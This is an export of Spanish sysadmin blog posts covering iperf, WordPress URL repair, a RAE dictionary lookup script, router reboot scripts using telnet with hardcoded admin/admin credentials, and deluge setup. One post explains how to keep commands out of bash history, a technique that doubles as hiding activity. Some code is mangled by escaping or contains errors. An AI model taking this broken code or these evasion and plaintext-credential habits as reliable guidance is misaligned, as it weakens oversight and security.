servidor y se lanza desde cada equipo desde el que queramos medir el ancho de banda en modo cliente. Por ejemplo, para probar el ancho de banda entre: un servidor conectado al router por cable con la IP 192.168.50.100 un portátil conectado a la red inalámbrica En el servidor ejecutamos: bash $ iperf -s En el cliente, indicando la IP del servidor: ```bash $ iperf -c 192.168.50.100 Client connecting to 192.168.50.100, TCP port 5001 TCP window size: 21.0 KByte (default) [ 3] local 192.168.50.100 port 58707 connected with 192.168.50.100 port 5001 [ ID] Interval Transfer Bandwidth [ 3] 0.0-10.1 sec 13.9 MBytes 11.5 Mbits/sec ``` En el servidor también nos aparecerá esta misma información. El cortafuegos Si estamos usando algún tipo de cortafuegos en el equipo que hace de servidor, y nos filtra el tráfico que manda iperf , deberemos habilitar una regla que permita el tráfico en el puerto 5001, el puerto por defecto que utiliza iperf . Por ejemplo, si usamos ufw : bash $ sudo ufw allow 5001 Si queremos permitir sólo el acceso a los clientes de la red: bash $ sudo ufw allow proto tcp from 192.168.50.0/24 to any port 5001 Para borrar la regla: bash $ sudo ufw delete allow proto tcp from 192.168.50.0/24 to any port 5001 Actualizado el 26 de junio de 2012 Interfaz gráfica Jperf es una interfaz gráfica para iperf . Si queremos utilizarla, descargamos la última versión desde su página: bash $ wget http://xjperf.googlecode.com/files/jperf-2.0.2.zip $ sha1sum jperf-2.0.2.zip 835fcaca05aab60adf0f507a8f203693aff5ea97 $ unzip jperf-2.0.2.zip $ cd jperf-2.0.2.zip $ sh jperf.sh Referencias » Verificando el ancho de banda entre tus clientes de la red","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/04/08/medir-el-ancho-de-banda-entre-dos-equipos-de-la-red/","loc":"https://karpoke.ignaciocano.com/2012/04/08/medir-el-ancho-de-banda-entre-dos-equipos-de-la-red/"},{"title":"Recuperar la dirección de WordPress","text":"En el panel de administración de WordPress, en Ajustes > Generales, podemos cambiar la dirección del blog o la dirección donde está instalado Wordpress. Tenemos que tener cuidado si cambiamos la dirección de WordPress, ya que podemos dejar el sitio, y en especial el panel de control, inaccesible. O puede que lo que nos interese sea actualizar el dominio antiguo por el nuevo. En ambas situaciones, si sólo se debe modificar el dominio, sin que se deba cambiar ninguna ruta relativa de acceso al blog, podemos lograr acceso al panel de administración incluyendo el nuevo dominio al archivo /etc/hosts , y desde ahí modificar cualquier variable que necesitemos. Pero si hemos cambiado la ruta relativa necesitaremos cambiar el valor en la base de datos. Podemos acceder a través de PhpMyAdmin o, si tenemos acceso al terminal, con un cliente de MySQL. Por ejemplo, si queremos asignar la dirección de WordPress a http://www.example.com : bash $ mysql -uuser -p wordpress mysql> update wp_options set option_value = \"http://www.example.com\" where option_name = \"siteurl\"; Si queremos modificar el valor de la dirección del sitio: mysql mysql> update wp_options set option_value = \"http://www.example.com\" where option_name = \"home\"; Para modificar la URL de los archivos subidos: mysql mysql> update wp_options set option_value = \"http://www.example.com/wp-uploads\" where option_name = \"upload_url_path\"; Si queremos hacer un cambio masivo, como cambiar una dirección que aparezca en el contenido de los artículos o de los comentarios: mysql mysql> update wp_posts set post_content = replace(post_content, 'example.com', 'new-domain.com'), guid = replace(guid, 'example.com', 'new-domain.com'); mysql> update wp_comments set comment_author_url = replace(comment_author_url, 'example.com', 'new-domain.com'); En el caso de los plugins, dependerá de cada caso. Por ejemplo: mysql mysql> update wp_randomtext set text = replace(text, 'example.com', 'new-domain.com'); Dos sentencias útiles, una nos muestra las tablas que tenemos y la otra la información de una tabla concreta: mysql mysql> show tables; mysql> desc wp_posts; Por último, si hemos actualizado la dirección de WordPress y estamos usando alguna técnica anti-hotlinking , deberíamos revisar el archivo .htaccess , por si debiéramos actualizarlo.","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/04/05/recuperar-la-direccion-de-wordpress/","loc":"https://karpoke.ignaciocano.com/2012/04/05/recuperar-la-direccion-de-wordpress/"},{"title":"Evitar el registro de comandos en el historial","text":"Por diferentes motivos, nos puede interesar que lo que escribamos en el terminal no quede registrado en el historial, por ejemplo, si necesitamos escribir una contraseña. Esto se puede conseguir de diferentes maneras. El historial cuenta con una copia en memoria, accesible mediante el comando history , que se vuelca en el fichero ~/.bash_history al terminar la sesión. Las variables involucradas en el historial son: HISTCONTROL , contiene una lista de valores separados por coma que indican bajo qué condiciones se deben añadir entradas al historial. Estos valores pueden ser ignorespace , ignoredups , ignoreboth o erasedups . HISTFILE , contiene el nombre del fichero donde se guardará el historial. Por defecto ~/.bash_history . HISTFILESIZE , contiene el número máximo de entradas que se guardarán en el fichero. Por defecto, 500. HISTIGNORE , contiene una lista separada por dos puntos : de los comandos que deben ser ignorados. Podemos utilizar * para crear patrones que deban coincidir. HISTSIZE , contiene el número de entradas en memoria que debe contener el historial. Por defecto, 500. HISTTIMEFORMAT , puede contener el formato utilizado para guardar la fecha y hora asociada a cada entrada en el historial. Espacio al inicio Una opción es especificar que se ignoren las entradas que comiencen con un espacio. Para activar esta opción de forma permanente, la variable HISTCONTROL debe contener el valor ignorespace o ignoreboth ( ignoreboth incluye ignorespace e ignoredups , ésta última es para ignorar duplicados) en nuestro archivo de configuración ~/.bashrc . Si sólo queremos que sea efectivo para la sesión actual podemos modificar el valor de la variable en el terminal. bash HISTCONTROL=ignoreboth Tamaño del historial Otra opción es poner modificar el valor de la variable HISTSIZE , que contiene el tamaño del historial en memoria. Por ejemplo, le asignamos un valor de 0 a la variable: bash HISTSIZE=0 Asignarle un valor vacío parece que provoca que sólo se guarde el último comando introducido y eliminar la variable con unset tampoco funciona, al menos en bash , ya que entonces toma el valor por defecto de 500. El fichero del historial Podemos modificar el valor de la variables HISTFILE o HISTFILESIZE para evitar que el historial de la sesión se guarde en disco al terminal. Hay que tener en cuenta que lo que escribamos seguirá disponible en memoria y será accesible con el comando history .","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/03/16/evitar-el-registro-de-comandos-en-el-historial/","loc":"https://karpoke.ignaciocano.com/2012/03/16/evitar-el-registro-de-comandos-en-el-historial/"},{"title":"Consultar el buscón de la RAE desde el terminal","text":"Al realizar consultas al buscón de la RAE desde el terminal, me iba muy lento. Ésta es una página que todavía usa marcos (wtf!), por lo que si queremos acceder directamente a la página con el resultado de la búsqueda deberemos utilizar una de las siguientes URLs: ~~Para el diccionario de la RAE : http://buscon.rae.es/draeI/SrvltGUIBusUsual?origen=RAE&TIPO_BUS=3&LEMA=cederrón ~~ ~~Para el diccionario panhispánico de dudas : http://buscon.rae.es/dpdI/SrvltGUIBusDPD?origen=RAE&lema=cederrón ~~ Actualización La RAE ha cambiado la URL de búsqueda, pasando a ser: Para el buscón: buscón : http://www.rae.es/drae/srv/search?origen=RAE&type=3&val=buscador Para el panhispánico de dudas : http://www.rae.es/dpd/srv/search?origen=RAE&key=terminal Además, también se ha cambiado la codificación de la URL de UTF-8 a ISO-8859-1, por lo que se deberá tener en cuenta para aquellas palabras que contengan caracteres donde ambas codificaciones son distintas, como las vocales con tilde o diéresis o la letra eñe. En el artículo, dejaré las referencias a las URLs antiguas para que quede un registro de cómo ha ido evolucionando el script . Para descargar y visualizar el contenido de una página desde el terminal lo podemos hacer de diferentes maneras, por ejemplo: $ curl -s \"http://buscon.rae.es/draeI/SrvltGUIBusUsual?origen=RAE&TIPO_BUS=3&LEMA=cederrón\" $ w3m -dump \"http://buscon.rae.es/draeI/SrvltGUIBusUsual?origen=RAE&TIPO_BUS=3&LEMA=cederrón\" $ lynx -dump \"http://buscon.rae.es/draeI/SrvltGUIBusUsual?origen=RAE&TIPO_BUS=3&LEMA=cederrón\" $ links -dump \"http://buscon.rae.es/draeI/SrvltGUIBusUsual?origen=RAE&TIPO_BUS=3&LEMA=cederrón\" $ elinks -dump \"http://buscon.rae.es/draeI/SrvltGUIBusUsual?origen=RAE&TIPO_BUS=3&LEMA=cederrón\" Pero con todas ellas me iba muy lento, incluso si sólo descargamos la cabecera: $ time curl -I -s \"http://buscon.rae.es/draeI/SrvltGUIBusUsual?origen=RAE&TIPO_BUS=3&LEMA=cederrón\" HTTP/1.1 200 OK Connection: close Date: Mon, 27 Feb 2012 23:20:26 GMT Server: Microsoft-IIS/6.0 Server: WebSphere Application Server/5.1 Content-Type: text/html Content-Language: es-ES real 0m38.410s user 0m0.008s sys 0m0.004s No parece que sea un problema de User Agent , porque tanto si utilizamos lynx como si utilizamos curl podemos modificarlo (y usar, por ejemplo, el de Firefox o el de Internet Explorer) y la página sigue tardando en responder. $ curl -s --user-agent \"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:10.0.2) Gecko/20100101 Firefox/10.0.2\" \"http://buscon.rae.es/draeI/SrvltGUIBusUsual?origen=RAE&TIPO_BUS=3&LEMA=cederrón\" El problema parece estar en el tiempo que tarda en resolverse el dominio. Usando nslookup podemos ver que tras el dominio buscon.rae.es hay un balanceador: $ nslookup buscon.rae.es Server: 208.67.222.222 Address: 208.67.222.222#53 Non-authoritative answer: buscon.rae.es canonical name = buscon.balanceo.rae.es. Name: buscon.balanceo.rae.es Address: 85.62.96.169 Podría ser que la primera vez que se hace una consulta en Firefox también tarde, y que las siguientes consultas sean instantáneas porque se guarde la IP, y sin embargo con curl estemos resolviendo la IP cada vez, pero tampoco podría asegurarlo dado no he hecho muchas más pruebas y lo siguiente me ha funcionado. Si utilizamos la IP en lugar del dominio,obtenemos una repuesta inmediata. Probad lo siguiente, si acaso con la IP que os devuelva nslookup : $ curl -s \"http://85.62.96.169/draeI/SrvltGUIBusUsual?LEMA=cederrón&origen=RAE&TIPO_BUS=3\" He probado con otros comandos en lugar de nslookup , como host o dig , pero con nslookup parece que se tarda menos en obtener la respuesta. El problema es que esta IP va cambiando, pero podemos utilizar nslookup en el script , cuyo resultado es instantáneo, y filtrar el resultado de curl tal como se ha comentado en este foro de Ubuntu : #!/bin/bash - set -o nounset # Treat unset variables as an error WORD=\"$1\" if [ -z \"$WORD\" ]; then echo \"Usage: ${0##*/} word\" exit 1 fi CURL=/usr/bin/curl HTML2TEXT=/usr/bin/html2text NSLOOKUP=/usr/bin/nslookup for p in $CURL $HTML2TEXT $NSLOOKUP; do if [ ! -x $p ]; then echo \"[+] $p not found. You must install it first.\" exit 1 fi done DOMAIN=buscon.rae.es IP=$($NSLOOKUP $DOMAIN | tail -2 | head -1 | awk '{print $2}') URL=\"http://$IP/draeI/SrvltGUIBusUsual?LEMA=$WORD&origen=RAE&TIPO_BUS=3\" RESET_TEXT='\\e[0m' # reset HIGHLIGHT_TEXT='\\e[0;31m' # red echo -e \"[+] ${HIGHLIGHT_TEXT}${WORD}${RESET_TEXT} $URL\\n\" \\(CURL -s \"\\) URL\" | $HTML2TEXT | head -n-2 | sed -e 's/[Ver_artículo_enmendado]/*\\ /g' Aquí se puede descargar el script rae.sh . Por último, un ejemplo de uso, suponiendo que el script tiene permisos de ejecución y se encuentra en el directorio actual: $ ./rae.sh cederrón [+] cederrón http://85.62.96.169/draeI/SrvltGUIBusUsual?LEMA=cederrón&origen=RAE&TIPO_BUS=3 cederrón. (De CD-ROM, y este sigla del ingl. CompactDiscRead-OnlyMemory). 1. m.Inform. CD-ROM. Actualizado el 12 de marzo de 2012 He realizado unas pequeñas modificaciones en el script : ya no acepta únicamente una palabra, sino una lista de ellas. Por ejemplo: ./rae.sh cederrón dvd disquete se puede utilizar el argumento -p para que busque también en el panhispánico de dudas. he cambiado el uso de curl por lynx , así no hay necesidad de parsear el resultado. he añadido autocompletado para las palabras. No están todas las que son ni son todas las que están, pero es bastante útil en la mayoría de las ocasiones. Actualizado el 30 de abril de 2012 Ha habido cambios en la página de la RAE, de tal manera que usar la IP directamente en la URL ya no sirve; la página devuelve un error 400 Bad Request (Invalid Hostname) . Una manera de resolver este inconveniente es añadir la IP y el dominio en el archivo /etc/hosts , para que podamos utilizar el dominio en la URL y no sea necesario resolver su IP: $ grep buscon.rae.es /etc/hosts 193.145.222.107 buscon.rae.es El script vuelve a funcionar como la seda, por ahora. Actualizado el 3 de julio de 2012 Ha vuelto a haber cambios en la página de la RAE. El dominio ha cambiado, pasando a ser lema.rae.es , y las rutas relativas para el Diccionario de la RAE y el Panhispánico de dudas también han cambiado. Ahora son algo así: # DRAE: http://lema.rae.es/drae/srv/search?type=3&val_aux=&origen=RAE&val=cederrón # DPD: http://lema.rae.es/dpd/srv/search?origen=RAE&key=cederrón La IP sigue siendo la misma por lo que basta cambiar el dominio en el fichero /etc/hosts : $ grep lema.rae.es /etc/hosts 193.145.222.107 lema.rae.es Aunque lo bueno es que vuelve a funcionar el truco de poner la IP en lugar del dominio en la URL, y la respuesta es incluso más rápida :) Actualizado el 7 de septiembre de 2012 Ha habido un nuevo cambio en la página del buscón de la RAE. Las nuevas URLs pasan a ser: Para el buscón: http://www.rae.es/drae Para el panhispánico de dudas: http://www.rae.es/dpd Además, la URL se debe codificar en formato Western (ISO-8859-1). Se ven afectadas aquellas palabras que tengan vocales con tilde, la u con diéresis o la letra eñe. Una manera de cambiar la codificación de la palabra es utilizar las funciones utf8_decode y urlencode de PHP, por lo que deberemos tener instalado el paquete php5-cli : $ php -r 'echo urlencode(utf8_decode(\"áéíóúüñ\"));' %E1%E9%ED%F3%FA%FC%F1 Añadir autocompletado Una de las características más útiles en la línea de comandos es el autocompletado. Empezamos a escribir un comando, un alias, un nombre de archivo o directorio, etc, y pulsamos el tabulador. Si sólo hay una opción posible cuyo prefijo coincida con lo que hemos escrito, ésta se completa mágicamente . Si hay más de una opción posible, no pasará nada, lo que nos indica que podemos pulsar el tabulador una vez más para que entonces nos muestre una lista de las opciones disponibles. Teniendo esto en cuenta, podríamos añadir autocompletado a nuestro script para que busque en el diccionario instalado en local. Realmente no es un diccionario, sino una lista de palabras en castellano ordenadas alfabéticamente que no tiene por qué ser completa. Para instalar este listado: $ sudo aptitude install wspanish El autocompletado se consigue mediante una función que especifica los resultados a mostrar, en función de diferentes factores. Por ejemplo, si estamos usando el comando ping es útil que autocomplete con los nombres de los hosts del fichero /etc/hosts , o si estamos matando un proceso, que utilice el PID de los procesos que hay en ejecución, si es con kill , o en los nombres de estos procesos, si es jhb pkill . Luego asociamos esta función con nuestro script . Crearemos un fichero que incluya dicha función, y luego la asocie a nuestro script . En Ubuntu, este fichero debe estar en /etc/bash_completion.d/ . Crearemos esta asociación mediante el comando complete . Este comando nos permite, además, consultar y modificar estas asociaciones. Por ejemplo, para ver la lista de asociaciones actual ejecutamos: $ complete -p El fichero es algo así: _foo() { local cur prev opts COMPREPLY=() cur=\"${COMP_WORDS[COMP_CWORD]}\" prev=\"${COMP_WORDS[COMP_CWORD-1]}\" opts=\"--help --verbose --version\" if [[ ${cur} == -* ]] ; then COMPREPLY=( $(compgen -W \"${opts}\" -- ${cur}) ) return 0 fi } complete -F _foo foo _foo es la función que se encarga de crear la lista de opciones disponibles. En este caso, permite seleccionar entre tres opciones posibles, --help , --verbose y --version . Las variables cur y prev contienen el argumento anterior y el actual (o lo que llevamos escrito de él), y se pueden utilizar para crear reglas de asociación más complejas. Por último, el comando compgen selecciona las candidatas de entre el listado de opciones disponibles. En las referencias al final se puede encontrar información más detallada. En el fichero /etc/bash_completion se pueden encontrar algunas de las expansiones más comunes como, por ejemplo, obtener un listado de directorios en el directorio actual, señales, direcciones MAC, interfaces de red, hosts , PIDs, UIDs, GIDs, servicios, módulos, módulos instalados, grupos a los que pertenece un usuario, usuarios autorizados, grupos autorizados, shells , tipos de sistemas de ficheros, etc. Sin embargo, en nuestro caso hay algo que deberemos tener en cuenta a la hora de crear el listado de opciones, y es que estas opciones son palabras que pueden contener espacios, comillas o barras invertidas, que puede que deban ser escapadas primero para poder ser utilizadas. Utilizaremos el siguiente código el el fichero de autocompletado rae : ```bash # http://stackoverflow.com/a/1146716 _find_words() { search= \\((eval echo \"\\) cur\" 2>/dev/null || eval echo \" \\(cur'\" 2>/dev/null || eval echo \"\\) cur\\\"\" 2>/dev/null || \"\") grep -- \"&#94;$search\" /usr/share/dict/spanish | sed -e \"{\" -e 's#\\#\\\\#g' -e \"s#'#\\\\'#g\" -e 's#\"#\\\\\"#g' -e \"}\" } _words_complete() { local IFS=$'\\n' COMPREPLY=() local cur=\"${COMP_WORDS[COMP_CWORD]}\" COMPREPLY=( $( compgen -W \"$(_find_words)\" -- \"$cur\" ) ) local escaped_single_qoute=\"'\\''\" local i=0 for entry in ${COMPREPLY[*]} do if [[ \"${cur:0:1}\" == \"'\" ]] then # started with single quote, escaping only other single quotes # [']bla'bla\"bla\\bla bla --> [']bla'\\''bla\"bla\\bla bla COMPREPLY[$i]=\"${entry//\\'/${escaped_single_qoute}}\" elif [[ \"${cur:0:1}\" == \"\\\"\" ]] then # started with double quote, escaping all double quotes and all backslashes # [\"]bla'bla\"bla\\bla bla --> [\"]bla'bla\\\"bla\\\\bla bla entry=\"${entry//\\\\/\\\\\\\\}\" COMPREPLY[$i]=\"${entry//\\\"/\\\\\\\"}\" else # no quotes in front, escaping _everything_ # [ ]bla'bla\"bla\\bla bla --> [ ]bla\\'bla\\\"bla\\\\bla\\ bla entry=\"${entry//\\\\/\\\\\\\\}\" entry=\"${entry//\\'/\\'}\" entry=\"${entry//\\\"/\\\\\\\"}\" COMPREPLY[$i]=\"${entry// /\\\\ }\" fi (( i++ )) done } complete -F _words_complete rae.sh ``` Hay que tener en cuenta que el script rae.sh debe ser accesible desde el path del sistema. Ahora, guardamos este fichero en /etc/bash_completion.d/rae y lo cargamos: . /etc/bash_completion.d/rae Ya podemos probarlo: $ rae.sh line[TAB][TAB] lineal lineamento lineamiento linear linera linero Referencias » DuckDuckGo » User Agent » Foro de Ubuntu-es » Bash manual > Programmable Completion » An introduction to bash completion » Handling spaces and quotes in autocompletion \"diccionario de la RAE\" \"diccionario panhispánico de dudas\" if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) { var align = \"center\", indent = \"0em\", linebreak = \"false\"; if (false) { align = (screen.width < 768) ? \"left\" : align; indent = (screen.width < 768) ? \"0em\" : indent; linebreak = (screen.width < 768) ? 'true' : linebreak; } var mathjaxscript = document.createElement('script'); mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#'; mathjaxscript.type = 'text/javascript'; mathjaxscript.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.3/latest.js?config=TeX-AMS-MML_HTMLorMML'; var configscript = document.createElement('script'); configscript.type = 'text/x-mathjax-config'; configscript[(window.opera ? \"innerHTML\" : \"text\")] = \"MathJax.Hub.Config({\" + \" config: ['MMLorHTML.js'],\" + \" TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'none' } },\" + \" jax: ['input/TeX','input/MathML','output/HTML-CSS'],\" + \" extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js'],\" + \" displayAlign: '\"+ align +\"',\" + \" displayIndent: '\"+ indent +\"',\" + \" showMathMenu: true,\" + \" messageStyle: 'normal',\" + \" tex2jax: { \" + \" inlineMath: [ ['\\\\\\\\(','\\\\\\\\)'] ], \" + \" displayMath: [ ['$$','$$'] ],\" + \" processEscapes: true,\" + \" preview: 'TeX',\" + \" }, \" + \" 'HTML-CSS': { \" + \" availableFonts: ['STIX', 'TeX'],\" + \" preferredFont: 'STIX',\" + \" styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} },\" + \" linebreaks: { automatic: \"+ linebreak +\", width: '90% container' },\" + \" }, \" + \"}); \" + \"if ('default' !== 'default') {\" + \"MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"}\"; (document.body || document.getElementsByTagName('head')[0]).appendChild(configscript); (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript); }","tags":"dev","url":"https://karpoke.ignaciocano.com/2012/02/28/consultar-el-buscon-de-la-rae-desde-el-terminal/","loc":"https://karpoke.ignaciocano.com/2012/02/28/consultar-el-buscon-de-la-rae-desde-el-terminal/"},{"title":"Reiniciar el router desde el terminal","text":"De vez en cuando, necesitamos reiniciar nuestro router . Por ejemplo, para provocar un cambio de IP, si tenemos IP dinámica. Podemos acceder al panel de administración del router mediante el navegador, normalmente en el puerto 80 u 8080, aunque también es posible hacerlo a través de telnet, en el puerto 22. Para hacer más sencillo este trámite, utilizaremos un script que se conecta por telnet al router , introduce el usuario y la contraseña y lo reinicia mediante el comando reboot . Esto dependerá de cada modelo de router en concreto, pero creo que funciona para un gran número. En principio, no es posible apagarlo, sólo reiniciarlo. El siguiente script , router.sh , permite ejecutar un comando en el router utilizando expect : ```bash !/usr/bin/expect -f set timeout 20 set username \"admin\" set password \"admin\" set ip \"192.168.1.1\" Read command as arg to this script set cmd [lindex $argv 0] spawn telnet $ip expect \"Login:\" send -- \" \\(username\\r\" expect \"Password:\" send -- \"\\) password\\r\" expect \" > \" send -- \"$cmd\\r\" expect \" > \" send -- \"&#94;D\" ``` Para reiniciarlo, ejecutamos: bash $ router.sh reboot Para obtener un listado de comandos disponibles, en este caso en un Comtrend: ```bash $ router.sh help spawn telnet 192.168.1.1 Trying 192.168.1.1... Connected to 192.168.1.1. Escape character is '&#94;]'. BCM96328 Broadband Router Login: admin Password: help ? help logout exit quit reboot adsl xdslctl xtm brctl cat loglevel logdest virtualserver ddns df dumpcfg dumpmdm meminfo psp kill dnsproxy syslog echo ifconfig ping ps pwd sntp sysinfo tftp wlctl arp defaultgateway dhcpserver dns lan lanhosts passwd ppp restoredefault route save swversion cfgupdate swupdate exitOnIdle wan build version ``` Mejorando el script Un inconveniente es que los datos de conexión, usuario, contraseña e IP, están escritos directamente en el script . Podemos modificar el script para que nos pida los datos, o pasárselos como parámetros, pero si lo hacemos así, prácticamente no ganamos nada respecto a conectarnos directamente por telnet al router . Mediante yad ( yet another dialog , un fork mejorado de zenity ), crearemos una sencilla interfaz gráfica que nos pida los parámetros previamente. Básicamente, consiste en mostrar una pantalla con 3 campos y los botones de aceptar y cancelar. La IP del router se obtiene de la salida del comando route . Una vez que se haya reiniciado el router , nos aparecerá una ventana mostrándonos la nueva IP. bash action=$(yad --title \"Router Reboot\" --image=gnome-shutdown --form --field=Username --field=Password:H --field=Gateway --separator=\" \" --button=\"gtk-ok:0\" --button=\"gtk-cancel:1\" $username $password $gateway) ret=$? Si le damos a aceptar, la variable $action contendrá el valor de las variables $username , $password y $gateway separados por un espacio, y $ret contendrá el valor del botón pulsado, 0 para aceptar y 1 para cancelar. bash $ echo $action admin admin 192.168.1.1 $ echo $ret 0 Enlace al script router-reboot . Actualizado el 26 de mayo de 2013 Ha caído en mis manos el router Comtred VR-3025u de Jazztel, que permite renovar la IP sin tener que reiniciar el router, por lo que el cambio es mucho más rápido que esperar a que reinicie. He encontrado el siguiente script en un foro de Banda Ancha para llevar a cabo la renovación de la IP: ```bash !/bin/sh vr3025u IFACE=ppp1.1 vr3025un IFACE=ppp1 USER=admin PASS=admin IP=192.168.1.1 ( sleep 3 echo $USER sleep 1 echo $PASS sleep 1 echo ppp config $IFACE down sleep 5 echo ppp config $IFACE up sleep 1 echo exit ) | telnet $IP ``` Referencias » Shell script to reboot DSL/ADSL router » yad examples » Script cambio IP Comtrend VR-3025un (para JDownloader) if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) { var align = \"center\", indent = \"0em\", linebreak = \"false\"; if (false) { align = (screen.width < 768) ? \"left\" : align; indent = (screen.width < 768) ? \"0em\" : indent; linebreak = (screen.width < 768) ? 'true' : linebreak; } var mathjaxscript = document.createElement('script'); mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#'; mathjaxscript.type = 'text/javascript'; mathjaxscript.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.3/latest.js?config=TeX-AMS-MML_HTMLorMML'; var configscript = document.createElement('script'); configscript.type = 'text/x-mathjax-config'; configscript[(window.opera ? \"innerHTML\" : \"text\")] = \"MathJax.Hub.Config({\" + \" config: ['MMLorHTML.js'],\" + \" TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'none' } },\" + \" jax: ['input/TeX','input/MathML','output/HTML-CSS'],\" + \" extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js'],\" + \" displayAlign: '\"+ align +\"',\" + \" displayIndent: '\"+ indent +\"',\" + \" showMathMenu: true,\" + \" messageStyle: 'normal',\" + \" tex2jax: { \" + \" inlineMath: [ ['\\\\\\\\(','\\\\\\\\)'] ], \" + \" displayMath: [ ['$$','$$'] ],\" + \" processEscapes: true,\" + \" preview: 'TeX',\" + \" }, \" + \" 'HTML-CSS': { \" + \" availableFonts: ['STIX', 'TeX'],\" + \" preferredFont: 'STIX',\" + \" styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} },\" + \" linebreaks: { automatic: \"+ linebreak +\", width: '90% container' },\" + \" }, \" + \"}); \" + \"if ('default' !== 'default') {\" + \"MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"}\"; (document.body || document.getElementsByTagName('head')[0]).appendChild(configscript); (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript); }","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/02/09/reiniciar-el-router-desde-bash/","loc":"https://karpoke.ignaciocano.com/2012/02/09/reiniciar-el-router-desde-bash/"},{"title":"Instalar deluge en Ubuntu Lucid Lynx","text":"deluge es un cliente de BitTorrent en el que la interfaz está separada del núcleo, que corre como un servicio, lo que posibilita usarlo de forma remota a través de una interfaz web. Instalación Podemos instalar deluge y su interfaz web desde los repositorios: bash $ sudo aptitude install deluged deluge-webui Crearemos el usuario \"deluge\" para ejecutar este servicio: bash $ sudo adduser --disabled-password --system --home /var/lib/deluge --gecos \"SamRo Deluge server\" --group deluge Creamos el script /etc/default/deluge-daemon : ```bash Configuration for /etc/init.d/deluge-daemon The init.d script will only run if this variable non-empty. DELUGED_USER=\"deluge\" Should we run at startup? RUN_AT_STARTUP=\"YES\" ``` Copiamos el script deluge-daemon a /etc/init.d y nos aseguramos de que tenga permisos de ejecución. Configuramos el script para ejecutarse al inicio: bash $ sudo update-rc.d deluge-daemon defaults Lo ejecutamos, para no tener que esperar al próximo reinicio: bash $ sudo invoke-rc.d deluge-daemon start Ya podemos acceder a la interfaz web: http://localhost:8112. La contraseña por defecto es \"deluge\". Nada más iniciar sesión deberíamos cambiarla. También tendremos la opción de usar SSL. El cortafuegos Si hemos instalado deluge en otro equipo de la red y tiene activado un cortafuegos deberemos permitir el acceso para poder acceder a la interfaz web. Por ejemplo, si usamos ufw y queremos que pueda acceder cualquier equipo dentro de la misma red deberíamos añadir la regla: bash $ sudo ufw allow proto tcp from 192.168.1.0/24 to any port 8112 Logging Si queremos que se recojan mensajes de log , deberemos crear los siguientes directorios para el usuario deluge : bash $ sudo mkdir -p /var/log/deluge/daemon $ sudo mkdir -p /var/log/deluge/web $ sudo chmod -R 755 /var/log/deluge $ sudo chown -R deluge /var/log/deluge Modificamos las opciones del script /etc/init.d/deluge-daemon para que contenga las líneas: bash DAEMON1_ARGS=\"-d -L warning -l /var/log/deluge/daemon/warning.log\" # Consult `man deluged` for more options DAEMON2_ARGS=\"-L warning -l /var/log/deluge/web/warning.log\" Y reiniciamos el servicio: bash $ sudo invoke-rc.d deluge-daemon restart Para rotar los ficheros de log : bash sudo cat > /etc/logrotate.d/deluge << EOF /var/log/deluge/_/_.log { weekly missingok rotate 7 compress notifempty copytruncate create 600 } EOF Referencias » How to install Deluge (v1.2.x/v1.3.x) headless on Ubuntu Server » Ubuntu Init Script » Bandwith Tweaking » Deluge FAQ \"cortafuegos\"","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/02/09/instalar-deluge-en-ubuntu-lucid-lynx/","loc":"https://karpoke.ignaciocano.com/2012/02/09/instalar-deluge-en-ubuntu-lucid-lynx/"},{"title":"Instalación de un nuevo kernel PPA en Ubuntu","text":"Esta receta muestra como instalar un nuevo kernel precompilado en Ubuntu. Antes de continuar, cabe avisar de que si tenemos módulos del kernel que no sean libres, por ejemplo, módulos de ATI, Broadcom o Virtualbox , es posible que nos surja algún problema que deberemos resolver en cada caso. En algunos 